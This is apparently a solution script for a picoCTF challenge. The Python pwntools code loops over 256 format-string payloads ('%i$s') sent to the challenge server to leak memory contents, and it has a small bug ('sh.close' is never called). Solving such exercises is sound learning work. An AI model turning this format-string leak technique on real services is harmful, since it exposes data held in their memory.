from pwn import *
import os

os.system('clear')

for i in range(256): # 129 + 64 + 64
    sh = remote('saturn.picoctf.net', 63788)
    sh.recvuntil(b'>')
    sh.sendline('%' + str(i) + '$s')
    print(sh.recvuntil(b'-')) 
    print(i) # print the iteration
    print(sh.recv()) # print the value
    
    sh.close # close the session if i == 255
